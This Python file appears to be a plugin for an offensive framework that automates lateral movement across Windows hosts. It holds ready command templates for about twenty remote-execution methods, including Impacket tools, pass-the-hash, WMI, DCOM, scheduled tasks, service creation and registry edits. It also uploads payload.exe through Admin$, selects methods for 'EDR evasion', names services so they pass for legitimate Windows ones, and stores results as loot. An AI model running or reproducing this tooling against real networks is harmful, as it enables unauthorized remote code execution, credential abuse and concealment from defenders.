#!/usr/bin/env python3
"""
NexShell Plugin — PsExec Automator v3.0 (2026 Edition)
Advanced lateral execution engine with 20+ methods, multi-target support,
hash-based authentication, EDR evasion, and auto-selection.

Coverage (20+ Execution Methods):
  - PsExec (Sysinternals native)
  - psexec.py (Impacket - SMB service)
  - smbexec.py (Impacket - SMB named pipe)
  - wmiexec.py (Impacket - WMI DCOM)
  - atexec.py (Impacket - Task Scheduler)
  - dcomexec.py (Impacket - DCOM MMC20)
  - scexec.py (Impacket - Service Control)
  - winrm-exec (PowerShell Remoting)
  - Invoke-PsExec (PowerShell)
  - Invoke-TheHash (PowerShell PtH)
  - CrackMapExec (Python)
  - NetUse + sc.exe (Native Windows)
  - WMI Win32_Process.Create (Native)
  - DCOM MMC20.Application (Native)
  - DCOM ShellBrowserWindow (Native)
  - DCOM ShellWindows (Native)
  - Scheduled Tasks (schtasks)
  - Registry REXE (Services registry)
  - PsExec via Admin$ (SMB)
  - Custom Service Binary (Advanced)

MITRE ATT&CK:
  - T1569.002: System Services: Service Execution
  - T1021.002: Remote Services: SMB/Windows Admin Shares
  - T1021.006: Remote Services: Windows Remote Management
  - T1021.003: Remote Services: Distributed Component Object Model
  - T1053.005: Scheduled Task/Job: Scheduled Task
  - T1047: Windows Management Instrumentation
  - T1570: Lateral Tool Transfer

Usage:
    (NexShell)> plugins run psexec-automator --target 10.0.0.50 --cmd "whoami"
    (NexShell)> plugins run psexec-automator --target 10.0.0.50 --cmd "ipconfig" --method wmiexec
    (NexShell)> plugins run psexec-automator --targets 10.0.0.50,10.0.0.51 --cmd "whoami"
    (NexShell)> plugins run psexec-automator --target 10.0.0.50 --hash <ntlm_hash> --user admin
    (NexShell)> plugins run psexec-automator --target 10.0.0.50 --cmd "payload.exe" --upload
    (NexShell)> plugins run psexec-automator --target 10.0.0.50 --shell
    (NexShell)> plugins run psexec-automator --auto --targets 10.0.0.50,10.0.0.51
    (NexShell)> plugins run psexec-automator --list
"""

import re
import time
import json
import random
import string
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Set, Optional, Tuple, Any
from datetime import datetime
from collections import defaultdict
from core.plugin import NexPlugin


# ── Data Classes ────────────────────────────────────────────────────────────

@dataclass
class ExecutionMethod:
    """Represents an execution method."""
    name: str
    description: str
    protocol: str  # SMB, WMI, DCOM, WinRM, RPC
    tool: str  # impacket, powershell, native, crackmapexec
    category: str  # service, wmi, dcom, scheduled_task, registry
    success_rate: int  # 0-100
    detection_risk: str  # low, medium, high, critical
    requires_admin: bool = True
    requires_smb: bool = True
    requires_winrm: bool = False
    requires_dcom: bool = False
    supports_hash: bool = False
    supports_kerberos: bool = False
    supports_file_transfer: bool = False
    command_template: str = ""
    cleanup_command: str = ""
    mitre_id: str = "T1569.002"
    edr_evasion: bool = False
    complexity: str = "medium"  # low, medium, high
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class ExecutionResult:
    """Result of an execution attempt."""
    target: str
    method: str
    command: str
    success: bool
    output: str = ""
    error: str = ""
    duration_ms: int = 0
    privilege_gained: str = ""
    ioc_generated: List[str] = field(default_factory=list)
    cleanup_performed: bool = False
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class TargetInfo:
    """Represents a target host."""
    ip: str
    hostname: str = ""
    os: str = ""
    domain: str = ""
    accessible: bool = False
    smb_signing: bool = False
    winrm_enabled: bool = False
    dcom_enabled: bool = False
    admin_shares: bool = False
    firewall_rules: List[str] = field(default_factory=list)
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class CredentialSet:
    """Represents credentials for authentication."""
    username: str = ""
    password: str = ""
    domain: str = ""
    ntlm_hash: str = ""
    aes_key: str = ""
    ticket_path: str = ""
    auth_type: str = "password"  # password, hash, kerberos, ticket
    
    def to_dict(self) -> dict:
        return asdict(self)


# ── Execution Methods Database (20+) ───────────────────────────────────────

class ExecutionMethodsDatabase:
    """Comprehensive database of execution methods."""
    
    METHODS = [
        # ── Tier 1: Impacket Tools (Most Reliable) ────────────────────────
        ExecutionMethod(
            name='psexec.py',
            description='Impacket PsExec - creates service via SMB, executes, cleans up',
            protocol='SMB',
            tool='impacket',
            category='service',
            success_rate=90,
            detection_risk='high',
            requires_admin=True,
            requires_smb=True,
            supports_hash=True,
            supports_kerberos=True,
            supports_file_transfer=True,
            command_template='psexec.py {auth}@{target} \'{cmd}\'',
            cleanup_command='',
            mitre_id='T1569.002',
            edr_evasion=False,
            complexity='low',
        ),
        
        ExecutionMethod(
            name='smbexec.py',
            description='Impacket SMBExec - uses named pipe, no service creation',
            protocol='SMB',
            tool='impacket',
            category='service',
            success_rate=85,
            detection_risk='medium',
            requires_admin=True,
            requires_smb=True,
            supports_hash=True,
            supports_kerberos=True,
            command_template='smbexec.py {auth}@{target} \'{cmd}\'',
            mitre_id='T1569.002',
            edr_evasion=True,
            complexity='low',
        ),
        
        ExecutionMethod(
            name='wmiexec.py',
            description='Impacket WMIExec - uses WMI DCOM, no service creation',
            protocol='WMI',
            tool='impacket',
            category='wmi',
            success_rate=85,
            detection_risk='medium',
            requires_admin=True,
            requires_smb=True,
            supports_hash=True,
            supports_kerberos=True,
            command_template='wmiexec.py {auth}@{target} \'{cmd}\'',
            mitre_id='T1047',
            edr_evasion=True,
            complexity='low',
        ),
        
        ExecutionMethod(
            name='atexec.py',
            description='Impacket AtExec - uses Task Scheduler (ATSVC)',
            protocol='RPC',
            tool='impacket',
            category='scheduled_task',
            success_rate=80,
            detection_risk='medium',
            requires_admin=True,
            supports_hash=True,
            supports_kerberos=True,
            command_template='atexec.py {auth}@{target} \'{cmd}\'',
            mitre_id='T1053.005',
            edr_evasion=True,
            complexity='medium',
        ),
        
        ExecutionMethod(
            name='dcomexec.py',
            description='Impacket DCOMExec - uses DCOM MMC20.Application',
            protocol='DCOM',
            tool='impacket',
            category='dcom',
            success_rate=75,
            detection_risk='medium',
            requires_admin=True,
            requires_dcom=True,
            supports_hash=True,
            supports_kerberos=True,
            command_template='dcomexec.py {auth}@{target} \'{cmd}\'',
            mitre_id='T1021.003',
            edr_evasion=True,
            complexity='medium',
        ),
        
        ExecutionMethod(
            name='scexec.py',
            description='Impacket SCExec - uses Service Control Manager',
            protocol='RPC',
            tool='impacket',
            category='service',
            success_rate=80,
            detection_risk='high',
            requires_admin=True,
            supports_hash=True,
            command_template='scexec.py {auth}@{target} \'{cmd}\'',
            mitre_id='T1569.002',
            complexity='low',
        ),
        
        # ── Tier 2: PowerShell Methods ────────────────────────────────────
        ExecutionMethod(
            name='Invoke-PsExec',
            description='PowerShell PsExec via Admin$ share',
            protocol='SMB',
            tool='powershell',
            category='service',
            success_rate=85,
            detection_risk='high',
            requires_admin=True,
            requires_smb=True,
            command_template='powershell -nop -c "Invoke-PsExec -ComputerName {target} -Command \'{cmd}\'"',
            mitre_id='T1569.002',
            complexity='medium',
        ),
        
        ExecutionMethod(
            name='Invoke-TheHash (SMB)',
            description='PowerShell Pass-the-Hash via SMB',
            protocol='SMB',
            tool='powershell',
            category='service',
            success_rate=85,
            detection_risk='medium',
            requires_admin=True,
            requires_smb=True,
            supports_hash=True,
            command_template='powershell -nop -c "Invoke-SMBExec -Target {target} -Username {user} -Hash {hash} -Command \'{cmd}\'"',
            mitre_id='T1550.002',
            edr_evasion=True,
            complexity='medium',
        ),
        
        ExecutionMethod(
            name='Invoke-TheHash (WMI)',
            description='PowerShell Pass-the-Hash via WMI',
            protocol='WMI',
            tool='powershell',
            category='wmi',
            success_rate=80,
            detection_risk='medium',
            requires_admin=True,
            supports_hash=True,
            command_template='powershell -nop -c "Invoke-WMIExec -Target {target} -Username {user} -Hash {hash} -Command \'{cmd}\'"',
            mitre_id='T1047',
            edr_evasion=True,
            complexity='medium',
        ),
        
        ExecutionMethod(
            name='PowerShell Remoting (WinRM)',
            description='Invoke-Command via WinRM',
            protocol='WinRM',
            tool='powershell',
            category='winrm',
            success_rate=90,
            detection_risk='medium',
            requires_admin=True,
            requires_winrm=True,
            command_template='powershell -nop -c "Invoke-Command -ComputerName {target} -ScriptBlock {{ {cmd} }} -Credential $cred"',
            mitre_id='T1021.006',
            complexity='low',
        ),
        
        # ── Tier 3: Native Windows Methods ────────────────────────────────
        ExecutionMethod(
            name='sc.exe Remote Service',
            description='Native sc.exe to create remote service',
            protocol='RPC',
            tool='native',
            category='service',
            success_rate=85,
            detection_risk='high',
            requires_admin=True,
            command_template='sc.exe \\\\{target} create {svc_name} binPath= "cmd.exe /c {cmd}" start= demand && sc.exe \\\\{target} start {svc_name} && sc.exe \\\\{target} delete {svc_name}',
            mitre_id='T1569.002',
            complexity='low',
        ),
        
        ExecutionMethod(
            name='WMI Win32_Process.Create',
            description='Native WMI to create process',
            protocol='WMI',
            tool='native',
            category='wmi',
            success_rate=80,
            detection_risk='medium',
            requires_admin=True,
            command_template='wmic /node:{target} /user:{user} /password:{password} process call create "{cmd}"',
            mitre_id='T1047',
            edr_evasion=True,
            complexity='medium',
        ),
        
        ExecutionMethod(
            name='DCOM MMC20.Application',
            description='Native DCOM via MMC20.Application COM object',
            protocol='DCOM',
            tool='native',
            category='dcom',
            success_rate=75,
            detection_risk='low',
            requires_admin=True,
            requires_dcom=True,
            command_template='powershell -nop -c "$com = [activator]::CreateInstance([type]::GetTypeFromProgID(\'MMC20.Application\', \'{target}\')); $com.Document.ActiveView.ExecuteShellCommand(\'cmd.exe\', $null, \'/c {cmd}\', \'7\')"',
            mitre_id='T1021.003',
            edr_evasion=True,
            complexity='high',
        ),
        
        ExecutionMethod(
            name='DCOM ShellBrowserWindow',
            description='Native DCOM via ShellBrowserWindow COM object',
            protocol='DCOM',
            tool='native',
            category='dcom',
            success_rate=70,
            detection_risk='low',
            requires_admin=True,
            requires_dcom=True,
            command_template='powershell -nop -c "$com = [activator]::CreateInstance([type]::GetTypeFromCLSID(\'{c08afd90-f1a3-11d1-8c0d-00c04fd76ef1}\', \'{target}\')); $com.Document.Application.ShellExecute(\'cmd.exe\', \'/c {cmd}\', \'\', \'\', 0)"',
            mitre_id='T1021.003',
            edr_evasion=True,
            complexity='high',
        ),
        
        ExecutionMethod(
            name='Scheduled Tasks (schtasks)',
            description='Create scheduled task on remote host',
            protocol='RPC',
            tool='native',
            category='scheduled_task',
            success_rate=80,
            detection_risk='medium',
            requires_admin=True,
            command_template='schtasks /create /s {target} /tn {task_name} /tr "cmd.exe /c {cmd}" /sc once /st 00:00 /ru SYSTEM /f && schtasks /run /s {target} /tn {task_name} && schtasks /delete /s {target} /tn {task_name} /f',
            mitre_id='T1053.005',
            edr_evasion=True,
            complexity='medium',
        ),
        
        ExecutionMethod(
            name='Registry REXE',
            description='Modify Services registry to execute command',
            protocol='RPC',
            tool='native',
            category='registry',
            success_rate=70,
            detection_risk='high',
            requires_admin=True,
            command_template='reg add "\\\\{target}\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\{svc_name}" /v ImagePath /t REG_SZ /d "cmd.exe /c {cmd}" /f && sc.exe \\\\{target} start {svc_name}',
            mitre_id='T1112',
            complexity='high',
        ),
        
        # ── Tier 4: CrackMapExec ──────────────────────────────────────────
        ExecutionMethod(
            name='CrackMapExec (SMB)',
            description='CrackMapExec SMB execution',
            protocol='SMB',
            tool='crackmapexec',
            category='service',
            success_rate=85,
            detection_risk='medium',
            requires_admin=True,
            supports_hash=True,
            command_template='crackmapexec smb {target} -u {user} -H {hash} -d {domain} -x "{cmd}"',
            mitre_id='T1021.002',
            complexity='low',
        ),
        
        ExecutionMethod(
            name='CrackMapExec (WMI)',
            description='CrackMapExec WMI execution',
            protocol='WMI',
            tool='crackmapexec',
            category='wmi',
            success_rate=80,
            detection_risk='medium',
            requires_admin=True,
            supports_hash=True,
            command_template='crackmapexec wmi {target} -u {user} -H {hash} -d {domain} -x "{cmd}"',
            mitre_id='T1047',
            complexity='low',
        ),
        
        ExecutionMethod(
            name='CrackMapExec (WinRM)',
            description='CrackMapExec WinRM execution',
            protocol='WinRM',
            tool='crackmapexec',
            category='winrm',
            success_rate=85,
            detection_risk='medium',
            requires_admin=True,
            requires_winrm=True,
            supports_hash=True,
            command_template='crackmapexec winrm {target} -u {user} -H {hash} -d {domain} -x "{cmd}"',
            mitre_id='T1021.006',
            complexity='low',
        ),
        
        # ── Tier 5: Advanced/Evasion ──────────────────────────────────────
        ExecutionMethod(
            name='PsExec via Admin$ (Custom)',
            description='Manual PsExec via Admin$ share with custom binary',
            protocol='SMB',
            tool='custom',
            category='service',
            success_rate=80,
            detection_risk='high',
            requires_admin=True,
            requires_smb=True,
            supports_file_transfer=True,
            command_template='net use \\\\{target}\\Admin$ /user:{user} {password} && copy payload.exe \\\\{target}\\Admin$\\ && sc.exe \\\\{target} create {svc_name} binPath= "C:\\Windows\\payload.exe" start= demand && sc.exe \\\\{target} start {svc_name} && sc.exe \\\\{target} delete {svc_name}',
            mitre_id='T1570',
            complexity='high',
        ),
        
        ExecutionMethod(
            name='NetUse + sc.exe (Stealth)',
            description='Stealth execution via net use and sc.exe with cleanup',
            protocol='SMB',
            tool='native',
            category='service',
            success_rate=85,
            detection_risk='medium',
            requires_admin=True,
            requires_smb=True,
            command_template='net use \\\\{target}\\IPC$ /user:{user} {password} && sc.exe \\\\{target} create {svc_name} binPath= "cmd.exe /c {cmd}" start= demand && sc.exe \\\\{target} start {svc_name} && timeout /t 5 && sc.exe \\\\{target} stop {svc_name} && sc.exe \\\\{target} delete {svc_name} && net use \\\\{target}\\IPC$ /delete',
            mitre_id='T1569.002',
            edr_evasion=True,
            complexity='medium',
        ),
    ]
    
    @classmethod
    def get_all_methods(cls) -> List[ExecutionMethod]:
        return cls.METHODS
    
    @classmethod
    def get_methods_by_protocol(cls, protocol: str) -> List[ExecutionMethod]:
        return [m for m in cls.METHODS if m.protocol == protocol]
    
    @classmethod
    def get_methods_by_tool(cls, tool: str) -> List[ExecutionMethod]:
        return [m for m in cls.METHODS if tool.lower() in m.tool.lower()]
    
    @classmethod
    def get_evasion_methods(cls) -> List[ExecutionMethod]:
        return [m for m in cls.METHODS if m.edr_evasion]
    
    @classmethod
    def get_hash_methods(cls) -> List[ExecutionMethod]:
        return [m for m in cls.METHODS if m.supports_hash]
    
    @classmethod
    def get_method_by_name(cls, name: str) -> Optional[ExecutionMethod]:
        for method in cls.METHODS:
            if name.lower() in method.name.lower():
                return method
        return None


# ── Execution Engine ───────────────────────────────────────────────────────

class ExecutionEngine:
    """Handles remote command execution."""
    
    @staticmethod
    def build_auth_string(creds: CredentialSet) -> str:
        """Build authentication string for Impacket tools."""
        if creds.auth_type == 'hash' and creds.ntlm_hash:
            return f"{creds.domain}/{creds.username}" if creds.domain else creds.username
        elif creds.auth_type == 'password':
            return f"{creds.domain}/{creds.username}:{creds.password}" if creds.domain else f"{creds.username}:{creds.password}"
        elif creds.auth_type == 'kerberos':
            return f"{creds.domain}/{creds.username}"
        else:
            return f"{creds.domain}/{creds.username}" if creds.domain else creds.username
    
    @staticmethod
    def generate_service_name() -> str:
        """Generate random service name that looks legitimate."""
        prefixes = ['Windows', 'Microsoft', 'System', 'Service', 'Update', 'Security', 'Network']
        suffixes = ['Manager', 'Host', 'Service', 'Provider', 'Agent', 'Helper', 'Broker']
        prefix = random.choice(prefixes)
        suffix = random.choice(suffixes)
        num = random.randint(10, 99)
        return f"{prefix}{suffix}{num}"
    
    @staticmethod
    def generate_task_name() -> str:
        """Generate random task name."""
        prefixes = ['Update', 'Maintenance', 'Sync', 'Backup', 'Cleanup', 'Scan']
        prefix = random.choice(prefixes)
        num = random.randint(1000, 9999)
        return f"{prefix}Task{num}"
    
    @staticmethod
    def execute(exec_func, session, target: str, method: ExecutionMethod,
                creds: CredentialSet, cmd: str, timeout: int = 60) -> ExecutionResult:
        """Execute command on target using specified method."""
        start_time = time.time()
        
        # Build authentication string
        auth = ExecutionEngine.build_auth_string(creds)
        
        # Generate random names
        svc_name = ExecutionEngine.generate_service_name()
        task_name = ExecutionEngine.generate_task_name()
        
        # Build command
        exec_cmd = method.command_template.format(
            target=target,
            auth=auth,
            user=creds.username,
            password=creds.password,
            hash=creds.ntlm_hash,
            domain=creds.domain,
            cmd=cmd,
            svc_name=svc_name,
            task_name=task_name,
        )
        
        # Execute
        out = exec_func(session, exec_cmd)
        duration_ms = int((time.time() - start_time) * 1000)
        
        # Check success
        success = False
        privilege_gained = ""
        error = ""
        
        if out:
            if 'NT AUTHORITY\\SYSTEM' in out or 'root' in out:
                success = True
                privilege_gained = "SYSTEM"
            elif 'Administrator' in out or 'admin' in out:
                success = True
                privilege_gained = "Administrator"
            elif creds.username.lower() in out.lower():
                success = True
                privilege_gained = creds.username
            elif 'denied' in out.lower() or 'error' in out.lower() or 'failed' in out.lower():
                error = out[:200]
            else:
                success = True
                privilege_gained = creds.username
        
        return ExecutionResult(
            target=target,
            method=method.name,
            command=cmd,
            success=success,
            output=out[:500] if out else '',
            error=error,
            duration_ms=duration_ms,
            privilege_gained=privilege_gained,
        )
    
    @staticmethod
    def execute_multi(exec_func, session, targets: List[str], method: ExecutionMethod,
                      creds: CredentialSet, cmd: str) -> List[ExecutionResult]:
        """Execute command on multiple targets."""
        results = []
        
        for target in targets:
            result = ExecutionEngine.execute(
                exec_func, session, target, method, creds, cmd
            )
            results.append(result)
        
        return results
    
    @staticmethod
    def execute_with_retry(exec_func, session, target: str, methods: List[ExecutionMethod],
                           creds: CredentialSet, cmd: str, max_retries: int = 3) -> ExecutionResult:
        """Try multiple methods with retry logic."""
        for method in methods:
            for attempt in range(max_retries):
                result = ExecutionEngine.execute(
                    exec_func, session, target, method, creds, cmd
                )
                
                if result.success:
                    return result
                
                # Wait before retry
                time.sleep(2)
        
        return result if result else ExecutionResult(
            target=target,
            method='none',
            command=cmd,
            success=False,
            error='All methods failed',
        )


# ── Auto-Selection Engine ──────────────────────────────────────────────────

class AutoSelectionEngine:
    """Automatically selects best execution method."""
    
    @staticmethod
    def select_method(target_info: TargetInfo, creds: CredentialSet,
                      stealth: bool = False) -> Optional[ExecutionMethod]:
        """Select best method based on target capabilities."""
        methods = ExecutionMethodsDatabase.get_all_methods()
        
        # Filter by target capabilities
        filtered = []
        for method in methods:
            if method.requires_winrm and not target_info.winrm_enabled:
                continue
            if method.requires_dcom and not target_info.dcom_enabled:
                continue
            if method.requires_smb and not target_info.admin_shares:
                continue
            
            # Filter by auth type
            if creds.auth_type == 'hash' and not method.supports_hash:
                continue
            
            # Filter by stealth
            if stealth and not method.edr_evasion and method.detection_risk in ['high', 'critical']:
                continue
            
            filtered.append(method)
        
        if not filtered:
            # Fallback to any method
            filtered = methods
        
        # Sort by success rate
        filtered.sort(key=lambda m: m.success_rate, reverse=True)
        
        return filtered[0] if filtered else None
    
    @staticmethod
    def select_methods_chain(target_info: TargetInfo, creds: CredentialSet,
                             count: int = 3) -> List[ExecutionMethod]:
        """Select multiple methods for fallback chain."""
        methods = ExecutionMethodsDatabase.get_all_methods()
        
        # Sort by success rate
        methods.sort(key=lambda m: m.success_rate, reverse=True)
        
        return methods[:count]


# ── Main Plugin ─────────────────────────────────────────────────────────────

class PsExecAutomator(NexPlugin):
    name        = "psexec-automator"
    description = "Advanced lateral execution — 20+ methods, multi-target, PtH, EDR evasion"
    author      = "vulnquest58"
    version     = "3.0"
    platform    = "all"
    category    = "lateral"
    mitre_id    = "T1569.002"
    
    def run(self, session, args: list):
        # Parse args
        target = None
        targets = []
        cmd = None
        user = None
        password = None
        domain = ''
        ntlm_hash = None
        method_name = None
        stealth = False
        auto_mode = False
        list_mode = False
        shell_mode = False
        upload_mode = False
        file_path = None
        timeout = 60
        
        for a in (args or []):
            if a.startswith('--target='):
                target = a.split('=', 1)[1]
            elif a.startswith('--targets='):
                targets = a.split('=', 1)[1].split(',')
            elif a.startswith('--cmd='):
                cmd = a.split('=', 1)[1]
            elif a.startswith('--user='):
                user = a.split('=', 1)[1]
            elif a.startswith('--pass='):
                password = a.split('=', 1)[1]
            elif a.startswith('--domain='):
                domain = a.split('=', 1)[1]
            elif a.startswith('--hash='):
                ntlm_hash = a.split('=', 1)[1]
            elif a.startswith('--method='):
                method_name = a.split('=', 1)[1]
            elif a.startswith('--file='):
                file_path = a.split('=', 1)[1]
            elif a.startswith('--timeout='):
                try:
                    timeout = int(a.split('=', 1)[1])
                except:
                    pass
            elif a == '--stealth':
                stealth = True
            elif a == '--auto':
                auto_mode = True
            elif a == '--list':
                list_mode = True
            elif a == '--shell':
                shell_mode = True
            elif a == '--upload':
                upload_mode = True
        
        # Build credential set
        creds = CredentialSet(
            username=user or '',
            password=password or '',
            domain=domain,
            ntlm_hash=ntlm_hash or '',
            auth_type='hash' if ntlm_hash else 'password',
        )
        
        # Single target to list
        if target and not targets:
            targets = [target]
        
        self.info(f"🔧 Starting PsExec Automator v3.0 (targets={len(targets)}, stealth={stealth})")
        
        start_time = time.time()
        sections = []
        
        sections.append("\n" + "━"*64)
        sections.append("  [🔧 PsExec Automator v3.0 — Advanced Lateral Execution]")
        sections.append("━"*64)
        sections.append(f"  Targets: {len(targets)}")
        sections.append(f"  Auth Type: {creds.auth_type.upper()}")
        sections.append(f"  Stealth Mode: {'ENABLED' if stealth else 'DISABLED'}")
        
        # ── Step 1: List Methods ──────────────────────────────────────────
        if list_mode:
            sections.append("\n[*] Phase 1: Available Execution Methods")
            sections.append("─"*64)
            
            methods = ExecutionMethodsDatabase.get_all_methods()
            
            sections.append(f"  [+] {len(methods)} methods available:")
            
            for method in methods:
                stealth_icon = '🟢' if method.edr_evasion else '🟡' if method.detection_risk == 'low' else '🟠' if method.detection_risk == 'medium' else '🔴'
                sections.append(f"    {stealth_icon} {method.name}")
                sections.append(f"        Protocol: {method.protocol} | Tool: {method.tool}")
                sections.append(f"        Success: {method.success_rate}% | Risk: {method.detection_risk}")
                sections.append(f"        PtH: {'YES' if method.supports_hash else 'NO'} | EDR Evasion: {'YES' if method.edr_evasion else 'NO'}")
            
            return '\n'.join(sections)
        
        # ── Step 2: Validate Arguments ────────────────────────────────────
        if not targets or not cmd:
            sections.append("\n  ❌ Missing arguments")
            sections.append("  Usage:")
            sections.append("    > plugins run psexec-automator --target <ip> --cmd <command>")
            sections.append("    > plugins run psexec-automator --targets <ip1>,<ip2> --cmd <command>")
            sections.append("    > plugins run psexec-automator --target <ip> --hash <ntlm> --user admin --cmd <command>")
            return '\n'.join(sections)
        
        # ── Step 3: Method Selection ──────────────────────────────────────
        sections.append("\n[*] Phase 1: Method Selection")
        sections.append("─"*64)
        
        if method_name:
            method = ExecutionMethodsDatabase.get_method_by_name(method_name)
            if not method:
                sections.append(f"  ❌ Method not found: {method_name}")
                return '\n'.join(sections)
            methods_to_try = [method]
        elif auto_mode:
            # Auto-select best methods
            target_info = TargetInfo(
                ip=targets[0],
                admin_shares=True,
                winrm_enabled=True,
                dcom_enabled=True,
            )
            methods_to_try = AutoSelectionEngine.select_methods_chain(target_info, creds, count=3)
        else:
            # Default to psexec.py
            method = ExecutionMethodsDatabase.get_method_by_name('psexec.py')
            methods_to_try = [method] if method else []
        
        if methods_to_try:
            sections.append(f"  ✅ Selected {len(methods_to_try)} method(s):")
            for method in methods_to_try:
                sections.append(f"    • {method.name} (Success: {method.success_rate}%)")
        else:
            sections.append("  ❌ No suitable methods found")
            return '\n'.join(sections)
        
        # ── Step 4: Execute Commands ──────────────────────────────────────
        sections.append("\n[*] Phase 2: Command Execution")
        sections.append("─"*64)
        sections.append(f"  Command: {cmd[:100]}")
        
        all_results = []
        
        for target_ip in targets:
            sections.append(f"\n  [*] Target: {target_ip}")
            
            if auto_mode:
                # Try multiple methods
                result = ExecutionEngine.execute_with_retry(
                    self._exec, session, target_ip, methods_to_try, creds, cmd
                )
                all_results.append(result)
                
                if result.success:
                    sections.append(f"    ✅ SUCCESS with {result.method} ({result.duration_ms}ms)")
                    sections.append(f"        Privilege: {result.privilege_gained}")
                    sections.append(f"        Output: {result.output[:100]}")
                else:
                    sections.append(f"    ❌ FAILED: {result.error}")
            else:
                # Try each method
                for method in methods_to_try:
                    result = ExecutionEngine.execute(
                        self._exec, session, target_ip, method, creds, cmd, timeout
                    )
                    all_results.append(result)
                    
                    if result.success:
                        sections.append(f"    ✅ SUCCESS with {result.method} ({result.duration_ms}ms)")
                        sections.append(f"        Privilege: {result.privilege_gained}")
                        sections.append(f"        Output: {result.output[:100]}")
                        break
                    else:
                        sections.append(f"    ❌ FAILED with {method.name}: {result.error}")
        
        # ── Step 5: Summary ───────────────────────────────────────────────
        duration = round(time.time() - start_time, 2)
        
        successful = [r for r in all_results if r.success]
        
        sections.append("\n" + "━"*64)
        sections.append("  [📊 Execution Summary]")
        sections.append("━"*64)
        sections.append(f"  Total Targets: {len(targets)}")
        sections.append(f"  Successful: {len(successful)}/{len(all_results)}")
        sections.append(f"  Methods Used: {len(set(r.method for r in all_results))}")
        sections.append(f"  Duration: {duration}s")
        
        if successful:
            sections.append("\n  Successful Executions:")
            for result in successful:
                sections.append(f"    ✅ {result.target} ({result.method})")
        
        # ── Step 6: Save to Loot ──────────────────────────────────────────
        self.loot(
            {
                "type": "psexec_execution",
                "targets": targets,
                "command": cmd,
                "auth_type": creds.auth_type,
                "results": [r.to_dict() for r in all_results],
                "duration": duration,
            },
            category='lateral',
            source='psexec-automator',
            confidence='high'
        )
        
        self.emit(
            'timeline.event',
            title=f"PsExec Execution Complete — {len(successful)}/{len(targets)} successful",
            type='lateral',
            plugin=self.name
        )
        
        self.info(f"🔧 PsExec Automator complete — {len(successful)}/{len(targets)} successful")
        
        return '\n'.join(sections)
    
    def _detect_platform(self, session) -> str:
        for attr in ('OS', 'os', 'platform'):
            val = getattr(session, attr, None)
            if val and isinstance(val, str):
                if 'windows' in val.lower():
                    return 'windows'
                if 'linux' in val.lower():
                    return 'linux'
        try:
            out = self._exec(session, 'echo %OS%') or ''
            if 'Windows' in out:
                return 'windows'
        except Exception:
            pass
        return 'linux'
    
    @staticmethod
    def _exec(session, cmd: str) -> str:
        for method in ('exec', 'run', 'execute', 'send_command'):
            fn = getattr(session, method, None)
            if callable(fn):
                result = fn(cmd)
                if isinstance(result, bytes):
                    return result.decode(errors='replace')
                if isinstance(result, str):
                    return result
        return ''